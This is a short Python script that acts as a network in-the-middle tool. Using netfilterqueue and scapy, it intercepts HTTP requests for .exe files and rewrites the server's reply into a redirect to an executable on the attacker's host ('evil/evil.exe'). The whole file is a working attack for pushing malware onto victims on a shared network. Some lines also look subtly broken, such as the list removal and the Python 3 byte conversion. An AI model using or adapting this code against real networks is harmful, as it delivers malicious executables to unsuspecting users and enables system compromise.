#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


ack_list = []

PORT = 80
ATTACKER_ADDR = "192.168.0.20"
ATTACKER_LOAD = "HTTP/1.1 301 Moved Permanently\nLocation: http://"+ ATTACKER_ADDR +"/evil/evil.exe\n\n"

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    print("waiting..")
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == PORT:
            if b".exe" in scapy_packet[scapy.Raw].load and bytes(ATTACKER_ADDR) not in scapy_packet[scapy.Raw].load: 
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
      
        elif scapy_packet[scapy.TCP].sport == PORT:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].ack)
                print("[+] Replacing file")
                new_packet = set_load(scapy_packet, ATTACKER_LOAD)
                packet.set_payload(bytes(new_packet))


    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
print("test1")
queue.run()




